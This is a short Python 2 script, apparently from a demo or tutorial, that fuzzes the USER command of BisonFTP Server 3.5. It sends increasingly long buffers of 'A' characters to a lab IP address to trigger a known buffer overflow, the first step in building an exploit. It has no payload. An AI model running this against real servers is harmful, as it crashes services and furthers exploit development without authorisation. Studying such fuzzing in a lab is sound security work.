#!/usr/bin/python
# BisonFTP Server <=v3.5 Remote Buffer Overflow Fuzzing
# exploit for Windows SP3 Spanish found at http://www.exploit-db.com/exploits/17649/

from demo_tools.decorators import demo
from socket import *
import sys, struct, os, time


@demo
def make_fuzzies():
    '''
    Generates a list of fuzzed buffers of increasing size.  We should be looking out for
    '\x41' in any error messages.
    '''
    fuzzies = ['A' * 320]
    counter = 420  # we know roughly where to start
    while len(fuzzies) <= 30:
        fuzzies.append('A' * counter)
        counter = counter + 100
    return fuzzies


@demo
def send_fuzzies(fuzzies):
    '''
    Connect to the remote host and send the fuzzed buffers.  Just crash if we run
    into a problem.
    '''
    host='192.168.14.128'
    port='21'

    for fuzz in fuzzies:
        print '[*] sending buffer of length {0}'.format(len(fuzz))

        # connect to host
        sock = socket(AF_INET,SOCK_STREAM)
        sock.connect((host, int(port)))
        banner = sock.recv(1024) # have to receive the FTP banner
        time.sleep(3)

        sock.send(fuzz) #this will send to the USER parameter  on the FTP server
        sock.recv(1024)
        sock.close()

fuzzies = make_fuzzies()
send_fuzzies(fuzzies)
